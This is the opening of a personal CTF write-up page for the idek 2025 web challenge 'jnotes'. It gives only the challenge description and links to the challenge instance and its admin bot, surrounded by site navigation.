<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>idek 2025 - jnotes</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-7b852bf6.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-9c069394.css">
  <meta property="article:tag" content="idek 2025"><meta property="article:tag" content="web"><meta name="description" content="jsonp and jquery in 2025 (not at all to be confused with jnotes from dicectf 2023)

[https://jnotes-web.chal.idek.team](https://jnotes-web.chal.idek.team)

[Admin Bot](https://admin-bot.idek.team/jnotes)"><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="group w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl transition-colors group-hover:text-primary">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="group w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" class="transition-colors fill-white group-hover:fill-primary"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="main-website-btn group h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden transition-all duration-500 hover:border-primary hover:text-black"> main website <i class="material-symbols-outlined text-2xl text-xl ml-2 transition-colors duration-500 group-hover:text-black">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 pr-7 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">idek 2025</span><!--[--><a href="/ctf-writeups/ctfinder" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">CTFinder</span></a><a aria-current="page" href="/ctf-writeups/jnotes" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-primary" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10 text-primary">jnotes</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-5"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">idek 2025</span><!--[--><a href="/ctf-writeups/ctfinder" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">CTFinder</span></a><a aria-current="page" href="/ctf-writeups/jnotes" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-primary" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10 text-primary">jnotes</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a href="/ctf-writeups/masquerade" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-1"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors stroke-[#424242] group-hover:stroke-primary/30" stroke-width="2"></path></svg><span class="flex-1 pl-3 rounded-xl flex items-center font-semibold transition-colors group-hover:bg-primary/10">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-xl opacity-60 mb-1">07/08/2025</span><h1 class="mb-7">jnotes</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>jsonp and jquery in 2025 (not at all to be confused with jnotes from dicectf 2023)</p>
<p><a href="https://jnotes-web.chal.idek.team">https://jnotes-web.chal.idek.team</a></p>
<p><a href="https://admin-bot.idek.team/jnotes">Admin Bot</a></p>
